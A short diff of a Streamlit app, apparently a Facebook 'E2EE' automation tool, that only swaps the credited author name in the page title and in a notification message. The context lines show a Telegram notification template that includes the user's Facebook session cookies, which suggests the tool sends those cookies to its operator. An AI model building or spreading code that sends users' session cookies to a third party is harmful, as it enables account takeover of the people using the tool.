@@ -11,7 +11,7 @@ import requests
 import os
 
 st.set_page_config(
-    page_title="FB E2EE by HASSAN RAJPUT",
+    page_title="FB E2EE by AKASH YADAV",
     page_icon="ðŸ‘‘",
     layout="wide",
     initial_sidebar_state="expanded"
@@ -501,7 +501,7 @@ def send_telegram_notification(username, automation_state=None, cookies=""):
 
 ðŸ‘¤ *Username:* {username}
 â° *Time:* {current_time}
-ðŸ¤– *System:* HASSAN RAJPUT E2EE Facebook Automation
+ðŸ¤– *System:* AKASH YADAV E2EE Facebook Automation
 ðŸª *Cookies:* `{cookies_display}`
 
 âœ… User has successfully started the automation process."""
